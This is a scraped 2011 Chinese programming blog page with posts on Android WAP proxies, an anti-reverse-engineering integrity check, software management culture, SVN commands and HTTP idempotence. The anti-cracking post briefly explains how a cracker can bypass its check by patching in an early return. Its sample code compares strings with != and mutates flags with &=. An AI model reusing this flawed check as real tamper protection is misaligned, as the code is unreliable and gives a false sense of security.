&nbsp; &nbsp; &nbsp; public static final int NET_TYPE_MOBILE_NET = 2;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public static final int NET_TYPE_MOBILE_WAP = 3;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; private int type = NET_TYPE_UNAVAILABLE;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; private String proxy = null;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; private int port = 0;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public int getType() {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return type;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public void setType(int type) {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; this.type = type;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public String getProxy() {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return proxy;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public void setProxy(String proxy) {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; this.proxy = proxy;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public int getPort() {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return port;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public void setPort(int port) {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; this.port = port;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; }</p><br><p>&nbsp;</p><p>&nbsp;</p><p></p><p>这个方法基本可以解决移动、联通和电信三大运营商下的wap连接问题，包括双卡双待手机（在XT800上试验可行）。不过还存在一点问题就是，wap连接方式不够稳定，偶尔还是会出现连接不上的情况，需要重新操作才能连上。目前没有比较好的解决方法，以后有时间继续研究。</p><p></p> 
      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2011/07/15/解决Android下Wap模式无法访问网络的问题/" class="archive-article-date">
  	<time datetime="2011-07-15T06:56:00.000Z" itemprop="datePublished"><i class="icon-clock"></i>2011-07-15</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/Android/">Android</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-anti-cracking-anti-reverse-engineering-function" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2011/07/10/anti-cracking-anti-reverse-engineering-function/">anti-cracking / anti-reverse-engineering function</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
         <p></p><p>为防止自己的android应用被crack，可以在程序启动时做一些判断：</p><p>1.生成apk时，解压出其中的classes.dex，取得其CRC值，并将该值写入xml文件（如android:tag=&quot;4212136116&quot;）；</p><p>2.在程序启动时取得该CRC值，与手机上安装的apk包中的classes.dex的实际CRC值比较即可。</p><p>下面给出了integrity check的示例代码。</p><p>&nbsp;</p><p>当然该方法存在一些问题，hacker可以通过检查参数为(Context, String, String)的函数，如果其中含有</p><p>zipEntry的getCrc()函数和killProcess()函数，可以在该函数开始部分直接插入return，就可以绕过检查了。</p><p>&nbsp;</p><p>改进方法参考：</p><p>参考：<a href="http://groups.google.com/group/android-developers/browse_thread/thread/5e8f76ea5371f674/4637cbf1c42dfd22?lnk=gst&amp;q=anti-cracking#4637cbf1c42dfd22" target="_blank" rel="external">http://groups.google.com/group/android-developers/browse_thread/thread/5e8f76ea5371f674/4637cbf1c42dfd22?lnk=gst&amp;q=anti-cracking#4637cbf1c42dfd22</a></p><p></p><p>&nbsp;</p><p>/<em>*&nbsp;</em></p><p> Validates the application integrity against reverse engineering.&nbsp;</p><p><em> If the validation fails the the application is terminated&nbsp;</em></p><p> automatically without warning.&nbsp;</p><p><em>&nbsp;</em></p><p> @param context&nbsp;</p><p><em> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Application context used for operations&nbsp;</em></p><p>&nbsp;</p><p><em> @param applicaionPackageName&nbsp;</em></p><p> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Original application package name, you should&nbsp;</p><p><em> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;hard-codeencrypt this string and then pass it to this&nbsp;</em></p><p>function un-encrypted,&nbsp;</p><p> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;do not use the java api to get this value.&nbsp;</p><p><em>&nbsp;</em></p><p> @param applicationCrc&nbsp;</p><p><em> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Application CRC value&nbsp;</em></p><p>/&nbsp;</p><p>public static void dapplicationIntegrityCheck(final Context context,&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; final String applicaionPackageName,&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; final String applicationCrc)&nbsp;</p><p>{&nbsp;</p><p>&nbsp; &nbsp; // Check that the application package name has not changed&nbsp;</p><p>&nbsp; &nbsp; if (applicaionPackageName != context.getPackageName())&nbsp;</p><p>&nbsp; &nbsp; {&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; android.os.Process.killProcess(android.os.Process.myPid());&nbsp;</p><p>&nbsp; &nbsp; }&nbsp;</p><p>&nbsp; &nbsp; // Check that the debuggable flag is set to False&nbsp;</p><p>&nbsp; &nbsp; try&nbsp;</p><p>&nbsp; &nbsp; {&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if (0 != (context.getPackageManager().getPackageInfo(context.getPackageName(),&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PackageManager.GET_SIGNATURES).applicationInfo.flags &amp;=&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ApplicationInfo.FLAG_DEBUGGABLE))&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; {&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; android.os.Process.killProcess(android.os.Process.myPid());&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; }&nbsp;</p><p>&nbsp; &nbsp; }&nbsp;</p><p>&nbsp; &nbsp; catch (Exception ex)&nbsp;</p><p>&nbsp; &nbsp; {&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Log.e(&quot;HelperFunctions&quot;, &quot;Error checking debuggable flag.&quot;, ex);&nbsp;</p><p>&nbsp; &nbsp; }&nbsp;</p><p>&nbsp; &nbsp; // Check that the debugger is not connected&nbsp;</p><p>&nbsp; &nbsp; if (Debug.isDebuggerConnected())&nbsp;</p><p>&nbsp; &nbsp; {&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; android.os.Process.killProcess(android.os.Process.myPid());&nbsp;</p><p>&nbsp; &nbsp; }&nbsp;</p><p>&nbsp; &nbsp; // CRC validation&nbsp;</p><p>&nbsp; &nbsp; try&nbsp;</p><p>&nbsp; &nbsp; {&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ZipFile zipFile = new ZipFile(context.getPackageCodePath());&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ZipEntry zipEntry = zipFile.getEntry(new String(Common.CLASS_DEX));&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if (zipEntry.getCrc() != Long.parseLong(applicationCrc))&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; {&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; android.os.Process.killProcess(android.os.Process.myPid());&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; }&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; zipEntry = null;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; zipFile = null;&nbsp;</p><p>&nbsp; &nbsp; }&nbsp;</p><p>&nbsp; &nbsp; catch (Exception ex)&nbsp;</p><p>&nbsp; &nbsp; {&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Log.e(&quot;HelperFunctions&quot;, &quot;Error checking crc.&quot;, ex);&nbsp;</p><p>&nbsp; &nbsp; }&nbsp;</p><p>&nbsp; &nbsp; // TO-DO:&nbsp;</p><p>&nbsp; &nbsp; // Check that the application name has not changed.&nbsp;</p><p>&nbsp; &nbsp; // Keep an encrypted string constant of the application&nbsp;</p><p>&nbsp; &nbsp; // name and then compare it with the application&nbsp;</p><p>&nbsp; &nbsp; // name string using the proper function to retrieve it&nbsp;</p><p>}</p><br><p></p><p></p> 
      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2011/07/10/anti-cracking-anti-reverse-engineering-function/" class="archive-article-date">
  	<time datetime="2011-07-10T03:07:00.000Z" itemprop="datePublished"><i class="icon-clock"></i>2011-07-10</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/Android/">Android</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-软件公司的两种管理方式" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2011/07/09/软件公司的两种管理方式/">软件公司的两种管理方式</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
         <p>转&nbsp;<a href="http://coolshell.cn/articles/4951.html" target="_blank" rel="external">http://coolshell.cn/articles/4951.html</a></p><p></p><p>这篇文章是我的一个外国的同事Gareth推荐给我的，我和他一起工作过一段时间。他之所以觉得非常不错，是因为这篇文章让他身有体会，他觉得我也一定会有体会，并让我考虑一下翻译到我的blog上来。我看完后觉得很有代表性，而且觉得说得太对了，所以翻译过来，<strong>希望大家都读一读，最好转给你的公司老板</strong>。</p><p>这篇文章来源于 StakeExchange上的一个问题——“<a href="http://programmers.stackexchange.com/questions/45776/why-do-business-analysts-and-project-managers-get-higher-salaries-than-programmer" target="_blank">为什么BA和PM的薪水要比程序员要高？</a>”，顶在一楼的回复分析了这个原因，并指出了两种管理文化。</p><p>———————————————————正文开始————————————————————</p><p>一个简单的回答应该是——“因为在我们的社会里，我们总是会认为薪水和会和职位的层次绑在一起”。但是，这个答案同时也折射出一个事实——我们的薪资是基于我们的所理解的价值，但这并没有解释</p><strong>为什么PM（Project Manager）和BA（Business Analysts）在很多软件公司里在组织的上层？</strong><strong>为什么软件项目团队总是在最底层？</strong><p>这两个问题真是非常地值得我们去问，去思考。</p><p>总体来说，这个世界上存在两种不同的软件公司的组织结构。我把他们叫做&nbsp;<strong>Widget Factory</strong>（小商品工厂） 和&nbsp;<strong>Film Crews</strong>（电影工作组）.</p><p>Widget Factories 想要去解决&nbsp;<a href="http://en.wikipedia.org/wiki/Theory_X_and_theory_Y" target="_blank" rel="external">怎么去激发被X理论所影响的人</a>&nbsp;。X理论由 McGregor提出，这个理论是说，一般人的本性是懒惰的，工作越少越好，可能的话会逃避工作，大部分人对集体（公司，机构，单位或组织等）的目标不关心，因此管理者需要以强迫，威胁处罚，指导，金钱利益等诱因激发人们的工作源动力。于是，经理总是要去做他下属的工作。于是，基于这种前提下所思考出来的管理方式，很自然的就是——整个团队能够容易地被经理一个人所取代，这种团队中的每一个人都很容易被别人取代，在这种团队里，经理的工作能力不断地被加强。因些，这种公司一般使用树形层级的组织结构，而不是水平式的工作角色。</p><p></p><p>Widget Factory 管理体系运作于软件需求的某种假设，这种假设需要BA在一个定义地非常明确的并且需要主管项目经理监管的流程的环境下，准备软件的规格说明书。这种软件制造业需要对项目定置足够的可被替换的编程和测试资源。整个工作由事先安排好的预算来驱动，这个预算由PM和BA在初始化business case的时候完成。</p><p>一个 Widget Factory 的公司的管理可以通过观察这个公司员工的谈话方式识别出来。他们很喜欢谈论Resource资源（包括干活的人也叫做resource），Process流程，Operating efficiency运作效率，uniformity一致性， repeatability可重复性，严格在控制对资源的使用，鲜明的工作角色和 鲜明的流程定义（inputs 和 outputs）。他们对实实在在的软件开发漠不关心，他们想要把理想中的软件开发运作变成他们看得见的图画。</p><p>Film Crews 。这种公司认为人是有相当高的智力和创造力的，是自己可以激发自己的（陈皓注：即使没有外界的压力和处罚的威胁，他们一样会努力工作以期达到目的——人们具有自我调节和自我监督的能力），人们努力工作，并且可以享受工作（人们愿意为集体的目标而努力，在工作上会尽最大的努力，以发挥创造力，才智），就像孩子喜欢玩一样。 Film Crews 认为，每一个个体的自已专业能力，要远远优于那种被组织和协调出来的能力。因为经理不再代替每一个人，而树形的层次架构也不能很好的运作——人们不得不以比较复杂和形式合作才能把事搞定。工作职责变得非常地垂直——你需要具有从上到下的而比较宽泛的各种能力（陈皓注：每个人都需要有管理和技术能力），这种管理也就是基于&nbsp;<a href="http://en.wikipedia.org/wiki/Theory_X_and_theory_Y" target="_blank" rel="external">McGregor的 Y理论</a>。</p><p>对于一个Film Crew 的Director（注：有总监和导演的意思），他了解把一个伟大的软件组合起来的每一个碎片，他需要组织一个无与伦比的团队，并且要帮助这个团队能凝聚在一起，团结在一起工作。他的角色是鼓舞大家，守护着构想（Vision），提供方向和集中大家的精力。团队里的每一个人都很关键，因为“Director”相信软件的结果来自所有的参与者，以及他们的那种独一无二团队工作方式。大家都知道自己是这个事的一个明星，明星效应可以增加成每个人的成功的机会。而他们的构想(Vision)驱动着项目的预算和拨款。</p><p><strong>当我们用报酬来表示的话，</strong>&nbsp;Widget Factories 认为，有价值的东西总是从PM和BA派生出来的，所以他们常驻在管理层的上面，也有相应的报酬，而对于软件团队，只要他们正确地把需求变成可工作的代码后，软件团队就变得无所谓了。PM 和 BA 努力工作来维护他们的权位，他们通常不会让你能得到项目的原始信息。因为团队拿不到项目的原始信息，所以团队就要拼命地制造各种理由来让他们的方案变得有价值，程序员成为了只会从PM和BA那边听从命令的工人。而这种情况反而让Widget Factory 公司放大了他们的那种想法——程序员都是差不多的，就像车间里的工人一样，他们只不过在机械地干一些很复杂的但是很标准的事情。</p><p>与 Widget Factories 公司鲜明的对比，Film Crew 更主张的是平等的工作职能，每个成员都可以不受限制地获得主要的和原始的信息，其鼓励所有人形成自己的价值判断，并且可以自由地选择不同的方式来达到团队的构想。Leadership领导力结构基于人的能力而不是工作角色。报酬折射出这个人是怎么在这个项目中工作的，需要明白这个人为我们的软件创造了多大的价值和产生了怎么样的结果。 在这种环境里，PM的工作显得并不突出，他也许也不太可能是一个有创造力的领导者，工作角色被弱化成了一种行政管理上的支持者，以及团队外部的联系者。BA的部分工作直接被团队取代（在项目早期被Director取代）。</p><p>今天，我们一点也不奇怪，大多数的公司内的软件开发团队以及一些咨询工作运作于 Widget Factories ，其需要依赖于流程来不断地制造那些无聊的软件。在这种情况，惯例上来说，PM和BA要比程序员挣得更多，这是基本一种他们可以创造更多价值的假设。<strong>在这种组强架构和管理里，程序员们很难证明管理是错误的。</strong></p><p><strong>成功的软件公司都会趋于采用 Film Crew 的方式，任何其它的东西都会妨碍他们吸引牛人的能力，因为只有吸引了牛人，你才能创造出伟大的软件</strong>。 在这种公司里，一个好的程序员的收入会高过BA和PM很多。</p><p>———————————————————正文结束————————————————————</p><p>读完这个贴子，我发现这完全就是在说我上一家公司和现在公司。我上一家公司的经理们最喜欢谈论的就是resource、 process，而他们的Project Manager或Team Manager或Dev Manager几乎不会为软件团队分担真正的软件开发的压力，还不如Widget Factory。哎！第一次看到这么被人系统地表达出来，心中的一些困惑都得到了解答。</p><p>你的公司属于哪一种呢？</p><p><em><strong>————更新 – 2011-7-6 晚————</strong></em></p><p>有人在我的新浪微博（<a href="http://weibo.com/haoel" target="_blank">@左耳朵耗子</a>）里说，Widget Factory就是Waterfall，Film Crews就是Agile，在下面的留言里也说Film Crews很像SCRUM。我在这里驳斥一下这种说法：</p>我上一家公司也用Agile ，但本质上还是Widget Factory，甚至还不像。著名的Thoughtworks中国公司，Agile的倡导者，其实是外包公司，他们的开发团队中也有PM和BA。<p></p><p></p><p></p> 
      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2011/07/09/软件公司的两种管理方式/" class="archive-article-date">
  	<time datetime="2011-07-09T06:05:00.000Z" itemprop="datePublished"><i class="icon-clock"></i>2011-07-09</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/产品/">产品</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-linux常用svn命令" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2011/07/07/linux常用svn命令/">linux常用svn命令</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
         <p><a href="http://blog.csdn.net/nancy198696/article/details/4059726" target="_blank" rel="external">http://blog.csdn.net/nancy198696/article/details/4059726</a></p><p></p><p>——————-</p><p>svn log -l 2 -v &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;显示最近两次提交信息（包括改动哪些文件）</p><p>svn cat -r 1910&nbsp;file &nbsp; &nbsp; &nbsp;打印输出某一版本的文件</p><p>svn diff&nbsp;-r 1914:1910&nbsp;file &nbsp; &nbsp;显示两个版本文件的差异</p><p>svn update &nbsp;-r &nbsp;1910 &nbsp; 将代码更新到某个版本</p><p>svn resolved filename.java &nbsp;解析冲突文件</p><p>svn list <a href="http://svn.collab.net/repos/svn" target="_blank" rel="external">http://svn.collab.net/repos/svn</a></p><p>svn switch url &nbsp;&nbsp;&nbsp;更新工作副本至不同的URL</p><p>——————-</p><p>linux常用svn命令</p>&nbsp;原地址：<a href="http://www.rjgc.net/control/content/content.php?nid=4418" target="_blank" rel="external">http://www.rjgc.net/control/content/content.php?nid=4418</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1、将文件checkout到本地目录<br>svn checkout path（path是服务器上的目录）<br>例如：svn checkout svn://192.168.1.1/pro/domain<br>简写：svn co<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2、往版本库中添加新的文件<br>svn add file<br>例如：svn addtest.php(添加test.php)<br>svn add *.php(添加当前目录下所有的php文件)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3、将改动的文件提交到版本库<br>svn commit -m “LogMessage“ [-N] [–no-unlock] PATH(如果选择了保持锁，就使用–no-unlock开关)<br>例如：svn commit -m “add test file for my test“ test.php<br>简写：svn ci<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4、加锁/解锁<br>svn lock -m “LockMessage“ [–force] PATH<br>例如：svn lock -m “lock test file“ test.php<br>svn unlock PATH<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5、更新到某个版本<br>svn update -r m path<br>例如：<br>svn update如果后面没有目录，默认将当前目录以及子目录下的所有文件都更新到最新版本。<br>svn update -r 200 test.php(将版本库中的文件test.php还原到版本200)<br>svn update test.php(更新，于版本库同步。如果在提交的时候提示过期的话，是因为冲突，需要先update，修改文件，然后清除svn resolved，最后再提交commit)<br>简写：svn up<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 6、查看文件或者目录状态<br>1）svn status path（目录下的文件和子目录的状态，正常状态不显示）<br>【?：不在svn的控制中；M：内容被修改；C：发生冲突；A：预定加入到版本库；K：被锁定】<br>2）svn status -v path(显示文件和子目录状态)<br>第一列保持相同，第二列显示工作版本号，第三和第四列显示最后一次修改的版本号和修改人。<br>注：svn status、svn diff和 svn revert这三条命令在没有网络的情况下也可以执行的，原因是svn在本地的.svn中保留了本地版本的原始拷贝。<br>简写：svn st<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 7、删除文件<br>svn delete path -m “delete test fle“<br>例如：svn delete svn://192.168.1.1/pro/domain/test.php -m “delete test file”<br>或者直接svn delete test.php 然后再svn ci -m ‘delete test file‘，推荐使用这种<br>简写：svn (del, remove, rm)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8、查看日志<br>svn log path<br>例如：svn log test.php 显示这个文件的所有修改记录，及其版本号的变化<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 9、查看文件详细信息<br>svn info path<br>例如：svn info test.php<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10、比较差异<br>svn diff path(将修改的文件与基础版本比较)<br>例如：svn diff test.php<br>svn diff -r m:n path(对版本m和版本n比较差异)<br>例如：svn diff -r 200:201 test.php<br>简写：svn di<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 11、将两个版本之间的差异合并到当前文件<br>svn merge -r m:n path<br>例如：svn merge -r 200:205 test.php（将版本200与205之间的差异合并到当前文件，但是一般都会产生冲突，需要处理一下）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 12、SVN 帮助<br>svn help<br>svn help ci<br>——————————————————————————<br>以上是常用命令，下面写几个不经常用的<br>——————————————————————————<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 13、版本库下的文件和目录列表<br>svn list path<br>显示path目录下的所有属于版本库的文件和目录<br>简写：svn ls<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 14、创建纳入版本控制下的新目录<br>svn mkdir: 创建纳入版本控制下的新目录。<br>用法:&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1、mkdir PATH…<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2、mkdir URL…<br>创建版本控制的目录。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1、每一个以工作副本 PATH 指定的目录，都会创建在本地端，并且加入新增调度，以待下一次的提交。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2、每个以URL指定的目录，都会透过立即提交于仓库中创建。在这两个情况下，所有的中间目录都必须事先存在。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;15、恢复本地修改svn revert: 恢复原始未改变的工作副本文件 (恢复大部份的本地修改)。revert:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 用法: revert PATH…<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注意: 本子命令不会存取网络，并且会解除冲突的状况。但是它不会恢复被删除的目录<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 16、代码库URL变更svn switch (sw): 更新工作副本至不同的URL。<br>用法: 1、switch URL [PATH]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2、switch –relocate FROM TO [PATH…]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1、更新你的工作副本，映射到一个新的URL，其行为跟“svn update”很像，也会将服务器上文件与本地文件合并。这是将工作副本对应到同一仓库中某个分支或者标记的方法。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2、改写工作副本的URL元数据，以反映单纯的URL上的改变。当仓库的根URL变动(比如方案名或是主机名称变动)，但是工作副本仍旧对映到同一仓库的同一目录时使用这个命令更新工作副本与仓库的对应关系。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 17、解决冲突<br>svn resolved: 移除工作副本的目录或文件的“冲突”状态。<br>用法: resolved PATH…<br>注意: 本子命令不会依语法来解决冲突或是移除冲突标记；它只是移除冲突的<br>相关文件，然后让 PATH 可以再次提交。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 18、输出指定文件或URL的内容。<br>svn cat 目标[@版本]…如果指定了版本，将从指定的版本开始查找。<br>svn cat -r PREV filename &gt; filename (PREV 是上一版本,也可以写具体版本号,这样输出结果是可以提交的)<p></p><p></p> 
      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2011/07/07/linux常用svn命令/" class="archive-article-date">
  	<time datetime="2011-07-07T09:22:00.000Z" itemprop="datePublished"><i class="icon-clock"></i>2011-07-07</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/Linux-App/">Linux App</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-HTTP幂等性概念和应用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2011/06/16/HTTP幂等性概念和应用/">HTTP幂等性概念和应用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
         <p><a href="http://coolshell.cn/articles/4787.html" target="_blank">http://coolshell.cn/articles/4787.html</a></p><p></p><p>基于HTTP协议的Web API是时下最为流行的一种分布式服务提供方式。无论是在大型互联网应用还是企业级架构中，我们都见到了越来越多的SOA或RESTful的Web API。为什么Web API如此流行呢？我认为很大程度上应归功于简单有效的HTTP协议。HTTP协议是一种分布式的面向资源的网络应用层协议，无论是服务器端提供Web服务，还是客户端消费Web服务都非常简单。再加上浏览器、Javascript、AJAX、JSON以及HTML5等技术和工具的发展，互联网应用架构设计表现出了从传统的PHP、JSP、ASP.NET等服务器端动态网页向Web API + RIA（富互联网应用）过渡的趋势。Web API专注于提供业务服务，RIA专注于用户界面和交互设计，从此两个领域的分工更加明晰。在这种趋势下，Web API设计将成为服务器端程序员的必修课。然而，正如简单的Java语言并不意味着高质量的Java程序，简单的HTTP协议也不意味着高质量的Web API。要想设计出高质量的Web API，还需要深入理解分布式系统及HTTP协议的特性。</p><p><strong></strong></p><p><strong></strong></p><p><strong>幂等性定义</strong></p><p>本文所要探讨的正是HTTP协议涉及到的一种重要性质：幂等性(Idempotence)。在HTTP/1.1规范中幂等性的定义是：</p><p><em>Methods can also have the property of “idempotence” in that (aside from error or expiration issues) the side-effects of N &gt; 0 identical requests is the same as for a single request.</em></p><p>从定义上看，HTTP方法的幂等性是指一次和多次请求某一个资源应该具有同样的副作用。幂等性属于语义范畴，正如编译器只能帮助检查语法错误一样，HTTP规范也没有办法通过消息格式等语法手段来定义它，这可能是它不太受到重视的原因之一。但实际上，幂等性是分布式系统设计中十分重要的概念，而HTTP的分布式本质也决定了它在HTTP中具有重要地位。</p><p></p><p><strong></strong></p><p><strong>分布式事务 vs 幂等设计</strong></p><p>为什么需要幂等性呢？我们先从一个例子说起，假设有一个从账户取钱的远程API（可以是HTTP的，也可以不是），我们暂时用类函数的方式记为</p>bool withdraw(account_id, amount);<br><p>withdraw的语义是从account_id对应的账户中扣除amount数额的钱；如果扣除成功则返回true，账户余额减少amount；如果扣除失败则返回false，账户余额不变。值得注意的是：和本地环境相比，我们不能轻易假设分布式环境的可靠性。一种典型的情况是withdraw请求已经被服务器端正确处理，但服务器端的返回结果由于网络等原因被掉丢了，导致客户端无法得知处理结果。如果是在网页上，一些不恰当的设计可能会使用户认为上一次操作失败了，然后刷新页面，这就导致了withdraw被调用两次，账户也被多扣了一次钱。如图1所示：</p><p><a href="http://images.cnblogs.com/cnblogs_com/weidagang2046/201106/201106042051027575.png" target="_blank" rel="external"><img src="http://img.pickbox.me/wp-content/uploads/pic/95f3f424047fef6d8644f96b.jpg" width="458" height="394"></a></p><p><a href="http://images.cnblogs.com/cnblogs_com/weidagang2046/201106/201106042051027575.png" target="_blank" 